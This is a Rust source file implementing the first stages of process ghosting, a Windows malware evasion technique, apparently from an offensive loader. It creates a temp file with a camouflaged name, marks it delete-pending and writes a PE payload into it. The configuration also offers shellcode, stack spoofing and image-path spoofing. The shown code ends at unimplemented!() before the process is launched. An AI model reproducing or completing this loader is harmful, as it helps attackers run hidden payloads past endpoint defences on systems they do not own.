use core::ffi::c_void;
use core::ptr::null_mut;

use crate::debug;
use crate::core::nt;
use crate::core::types::*;
use crate::core::win32;

pub struct Config<'a> {
    pub pe_payload: &'a [u8],
    pub shellcode: &'a [u8],
    pub spoof_image_path: Option<&'a [u16]>,
    pub enable_stack_spoof: bool,
    pub enable_ghosting: bool,
}

pub struct State {
    pub file_handle: HANDLE,
    pub section_handle: HANDLE,
    pub process_handle: HANDLE,
    pub thread_handle: HANDLE,
    pub process_id: usize,
    pub params_remote: *mut c_void,
    pub params_size: usize,
}

impl State {
    pub fn new() -> Self {
        Self {
            file_handle: null_mut(),
            section_handle: null_mut(),
            process_handle: null_mut(),
            thread_handle: null_mut(),
            process_id: 0,
            params_remote: null_mut(),
            params_size: 0,
        }
    }

    pub unsafe fn rollback(&mut self) {
        nt::nt_close(self.thread_handle);
        self.thread_handle = null_mut();

        nt::nt_terminate_process(self.process_handle, 1);
        nt::nt_close(self.process_handle);
        self.process_handle = null_mut();

        nt::nt_close(self.section_handle);
        self.section_handle = null_mut();

        nt::nt_close(self.file_handle);
        self.file_handle = null_mut();
    }
}

pub unsafe fn ghost_process(config: &Config) -> Option<State> {
    if config.pe_payload.is_empty() { return None; }

    // Validate PE signature
    if config.pe_payload.len() < 0x40 { 
        debug!("[GHOST] PE payload too small: {} bytes", config.pe_payload.len());
        return None; 
    }

    let dos_magic = *(config.pe_payload.as_ptr() as *const u16);
    if dos_magic != IMAGE_DOS_SIGNATURE {
        debug!("[GHOST] Invalid DOS signature: {:04X} != 0x5A4D", dos_magic);
        return None;
    }

    let mut state = State::new();

    let temp_path = generate_temp_path();
    let mut file_path_unicode_string = UnicodeString {
        length: 0,
        maximum_length: 0,
        buffer: null_mut(),
    };
    win32::rtl_init_unicode_string(&mut file_path_unicode_string, temp_path.as_ptr());
    let mut obj_attr: ObjectAttributes = core::mem::zeroed();
    initialize_object_attributes(
        &mut obj_attr,
        &mut file_path_unicode_string, 
        0x00000040, 
        null_mut(), 
        null_mut()
    );

    let mut io_status: IoStatusBlock = core::mem::zeroed();
    let status = nt::nt_create_file(
        &mut state.file_handle,
        0x00010000 | 0x00100000 | 0x80000000 | 0x40000000,
        &mut obj_attr,
        &mut io_status,
        null_mut(),
        0x00000080,
        0,
        0x00000005,
        0x00000060, // FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
        null_mut(),
        0,
    );

    if status != STATUS_SUCCESS || state.file_handle.is_null() {
        debug!("[GHOST] NtCreateFile failed: 0x{:08X}", status);
        return None;
    }
    debug!("[GHOST] Temp file created, handle: {:p}", state.file_handle);

    // Mark the file DELETE_PENDING
    let mut disposition_infomration = FileDispositionInformation{ delete_file: 1 };
    io_status = core::mem::zeroed();
    let status = nt::nt_set_information_file(
        state.file_handle,  
        &mut io_status, 
        &mut disposition_infomration as *mut _ as *mut c_void,
        core::mem::size_of::<FileDispositionInformation>() as u32,
        13 as u32
    );
    if status != STATUS_SUCCESS {
        debug!("[GHOST] NtSetInfformationFile failed: 0x{:08X}", status);
        return None;
    }
    debug!("[GHOST] File marked DELETE_PENDING");


    // Write PE payload into the deleted pending file with explicit offset
    // Supply ByteOffset AND check io_status.information so partial wites cannot silently currupt the PE layout 
    let chunk_size: usize = 4096;
    let mut written: usize = 0;

    while written < config.pe_payload.len() {
        let remaining = config.pe_payload.len() - written;
        let this_chunk = if remaining < chunk_size { remaining } else { chunk_size };
        
        let mut byte_offset: i64 = written as i64;
        io_status = core::mem::zeroed();
        let status = nt::nt_write_file(
            state.file_handle,
            null_mut(),
            null_mut(),
            null_mut(),
            &mut io_status,
            config.pe_payload.as_ptr().add(written) as *const c_void,
            this_chunk as u32,
            &mut byte_offset as *mut _ as *mut c_void,
            null_mut(),
        );

        if status != STATUS_SUCCESS {
            debug!("[GHOST] NtWriteFile failed at offset {}: 0x{:08X}", written, status);
            state.rollback();
            return None;
        }

        let actually_written = io_status.information;
        if actually_written == 0 {
            debug!("[GHOST] NtWriteFile wrote 0 bytes at offset {}", written);
            state.rollback();
            return None;
        }
        written += actually_written;
    }



    unimplemented!()
}

unsafe fn generate_temp_path() -> [u16; 48] {
    let mut path: [u16; 48] = [0u16; 48];

    let prefixes: [[u16; 3]; 6] = [
        [0x0074, 0x006D, 0x0070],  // tmp
        [0x0063, 0x0061, 0x0062],  // cab
        [0x0068, 0x0073, 0x0070],  // hsp
        [0x006D, 0x0073, 0x0074],  // mst
        [0x0064, 0x0066, 0x007E],  // df~
        [0x0073, 0x0063, 0x0070],  // scp
    ];

    let base_prefix: &[u16] = &[
        0x005C, 0x003F, 0x003F, 0x005C,                                 // \??\
        0x0043, 0x003A, 0x005C,                                         // C:\
        0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, // Windows\
        0x0054, 0x0065, 0x006D, 0x0070, 0x005C,                         // Temp\
    ];

    let mut i = 0;
    while i < base_prefix.len() {
        path[i] = base_prefix[i];
        i += 1;
    }

    let seed: u64;
    #[cfg(target_arch = "x86_64")]
    {
        core::arch::asm!(
            "rdtsc",
            "shl rdx, 32",
            out("rax") seed,
            out("rdx") _
        );
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        seed = 0x1A2B3C4D;
    }

    // Select random prefix from pool
    let prefix_idx = ((seed >> 16) as usize) % prefixes.len();
    let chosen = &prefixes[prefix_idx];
    path[i] = chosen[0]; i += 1;
    path[i] = chosen[1]; i += 1;
    path[i] = chosen[2]; i += 1;

    let hex_chars: &[u16; 16] = &[
        0x0030, 0x0031, 0x0032, 0x0033, 0x0034, 0x0035, 0x0036, 0x0037, 
        0x0038, 0x0039, 0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046,
    ];
    let mut value = seed;
    for j in 0..8 {
        path[i + j] = hex_chars[(value & 0x0F) as usize];
        value >>= 4;
    }
    i += 8;

    // .tmp\0
    path[i] = 0x002E; i += 1; // .
    path[i] = 0x0074; i += 1; // t
    path[i] = 0x006D; i += 1; // m
    path[i] = 0x0070; i += 1; // p
    path[i] = 0x0000; // terminator

    path
}

